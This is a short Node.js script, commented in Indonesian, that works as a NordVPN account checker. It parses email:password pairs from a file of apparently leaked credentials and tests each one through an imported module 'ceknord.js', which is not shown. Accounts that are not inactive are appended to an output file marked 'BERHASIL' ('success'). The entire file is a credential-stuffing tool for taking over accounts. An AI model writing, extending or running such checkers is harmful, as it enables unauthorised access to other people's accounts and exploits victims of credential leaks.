process.on('SIGINT', function() {
    console.log("Pengecekan akun nordvpn telah berhenti");
    process.exit();
});

const filterString = (str) => {
    d = str.split(':');
    for (a = 0; a < d.length - 1; a++) {
        zz = d[a];
        // cari email
        email = "";
        if (zz.split(' ').length > 1) {
            for (pisah of zz.split(' ')) {
                if (pisah.indexOf('@') > -1) {
                    email = pisah;
                    caripass = d[a + 1];
                    if (caripass.split(' ').length > 1) {
                        password = caripass.split(' ')[0];
                    } else {
                        password = caripass;
                    };
                    return { status: 'ok', result: { email, password } };
                };
            };
        } else {
            if (zz.indexOf('@') > -1) {
                email = zz;
                caripass = d[a + 1];
                if (caripass.split(' ').length > 1) {
                    password = caripass.split(' ')[0];
                } else {
                    password = caripass;
                };
                return { status: 'ok', result: { email, password } };
            };
        };
    };
};

const nord = require('./ceknord.js')
const fs = require('fs');

fs.readFile('../akun', 'utf8', async(err, data) => {
    if (err) {
        return console.log(err);
    };
    for (hasil of data.split('\n')) {
        if (hasil) {
            aa = await filterString(hasil);
            console.log(aa.result)
            if (aa && aa.status === "ok") {
                hasill = `${aa.result.email}:${aa.result.password}\n`
                result = aa.result;
                await nord(result.email, result.password).then(async(hsl) => {
                    if (hsl && hsl.status === "ok" && hsl.result !== "inactive") {
                        await fs.writeFileSync('../hasil', hsl.result + '\n', { flag: "a+" })
                        console.log('BERHASIL', hsl.result)
                    } else if (hsl && hsl.status === "no") {
                        if (hsl.result === "limit") {
                            return console.log(`Saran:${hsl.saran}`);
                        } else {
                            console.log(hsl.result)
                        }
                    } else {
                        console.log(hsl);
                    };
                });
            } else {
                console.error('Error', aa)
            };
        }
    };
});